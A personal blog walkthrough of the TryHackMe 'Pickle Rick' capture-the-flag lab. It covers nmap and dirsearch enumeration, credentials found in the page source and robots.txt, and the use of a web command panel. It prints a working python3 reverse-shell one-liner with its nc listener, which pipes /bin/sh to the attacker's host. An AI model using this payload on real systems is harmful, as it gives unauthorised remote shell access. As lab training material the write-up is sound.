---
title: "Pickle Rick"
date: 2021-11-24T20:23:56+05:30
tags:
  - tryhackme
---

<p>Pickle Rick is a Rick and Morty themed challenge that requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a picke. No information related to the show is required.</p>
<figure>
    <img src="https://i.imgur.com/Wdm7hYh.png"/> 
</figure>

<p>On the first page, there is nothing worth looking at. I tried clicking around the picture a bit to see if they lead to a link but nothing of that sort. Next step was to inspect element and view the source. On doing so the very first thing visible was:</p>
<figure>
    <img src="https://i.imgur.com/yB5T36w.png"/> 
</figure>

<p>As we can see, the username is important and we just keep that in mind.</p>
<pre><code>Username: R1ckRul3s
</code></pre><p>We do not see any other useful information via the inspect element. Next step, enumeration. First, we try to do it using <code>nmap</code> which gives us the ports which are open</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nmap -A &lt;ip address&gt;
</code></pre></div><p>and you get the output as:</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-24 20:54 IST
Nmap scan report for 10.10.191.134
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:26:28:e2:08:ac:c3:90:c0:89:05:f1:a0:13:25:bd (RSA)
|   256 ee:03:58:01:26:f9:78:ce:44:8a:12:01:f6:83:ba:1f (ECDSA)
|_  256 c8:ce:f3:b3:65:32:cd:20:60:24:f2💿63:eb:bc:06 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.26 seconds
</code></pre></div><p>As you can see, only 2 ports are open, 22 and 80. I tried going to both of them by <code>&lt;ip address&gt;/&lt;port num&gt;</code> but there was nothing useful out there. Still a good thing to know.</p>
<p>Next up, we try to enumerate better. dirsearch (<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>) is a really cool tool which you can download which can brute force directories, files etc via command-line in the specified webservers. Once you have installed it in your system just type in:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python3 diresearch.py -u http://&lt;ip adress&gt;
</code></pre></div><p>It will take about 2-3 minutes to get the output.</p>
<figure>
    <img src="https://i.imgur.com/wZ8bNlH.png"/> 
</figure>

<p>Now, there are a lot of files that it has shown, most of which are hidden and hence unimportant. The ones may be important are the ones which are highlighted by the tool, hence we start checking them out. First up, lets go to the assets directory mentioned.</p>
<figure>
    <img src="https://i.imgur.com/hwpCfxv.png"/> 
</figure>

<p>Honestly, this was a bit dissapointing, there was nothing of use here :p. If you want go check out all the different files mentioned and you would probably come to the same conclusion.
Next up, lets go check out the <code>index.html</code>. Uh well, that just takes us back to the home page. Next one. <code>login.php</code>. This takes us to a login page! Remember the username we found in the source? This might be where we need to use it! Now we need to figure out the password. I checked the source code of this page as well and found nothing interesting in it. Lets go to the next page, <code>robots.txt.</code></p>
<p>Boom! We find <code>&lt;password&gt;</code> written on this page! Now lets try to put that in as credentials and see where this leads us.</p>
<p>We come on to <code>portal.php</code> which shows us a command pannel! How exciting. Go around the website a bit, click on different tabs. Nothing of use is seen there either. So the main key to solving this puzzle is via the command pannel. Try typing in <code>ls</code> in the command and see the answers.</p>
<figure>
    <img src="https://i.imgur.com/GXGKWRQ.png"/> 
</figure>

<p>This is nice! there are two files which immediately look pretty interesting, <code>Sup3rS3cretPickl3Ingred.txt</code> and <code>clue.txt</code>. Lets check them out by <code>cat</code>.</p>
<p>If you did try out the command <code>cat</code>, you probably hit a wall telling you that the command has been disabled and you must try some other way to retrieve the files. Now, simple google searches would probably reveal multiple different methods of displaying the files without using <code>cat</code> at all, but since that is against the spirit of the room I will skip over that :p</p>
<p>So we have a command line where the website is not allowing us to use some commands. Lets see if it allows us to use python to get the reverse shell on our temrinal. Try typing in <code>python</code> or <code>python3</code>. You would observe that it does not allow <code>python</code> but allows <code>python3</code>. Boom, now we just need to execute the command to get the reverse shell.</p>
<p>Here is a cheatsheet displaying different reverse shell commands: <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
<p>For the python one, just remember that the &lsquo;attackers ip&rsquo; is our ip adress, which you can easily google on how to get. And specify any port that you want to. Before executing the command, just type in:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nc -nlvp &lt;port number&gt;
</code></pre></div><p>Let this command run in your terminal and copy the following as mentioned in the cheatsheet:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;YOUR IP&gt;&#34;,&lt;PORT NUMBER&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</code></pre></div><p>Type this in the command line in the website and you would see the shell get connected in your terminal. 10.17.9.4</p>
<figure>
    <img src="https://i.imgur.com/MUbaeGp.png"/> 
</figure>

<p>Well, now our cat works! Just <code>cat</code> out the <code>Sup3rSrcretPickl3Ingred.txt</code> file and you will have the first answer. Next up, <code>cat</code> the <code>clue.txt</code>. This will tell you to just look around the file structures for different text files.</p>
<p>Honestly, the &ldquo;hacking&rdquo; part of the room is done here, now you just need to find the files which is easy enough. I will give you some hints to do that, but imo there is no need for more explanations.</p>
<p>For second clue: check out the home directory, might find something interesting there :p
For third clue: check out the root directory using sudo command!</p>
<p>And boom, you are done!</p>
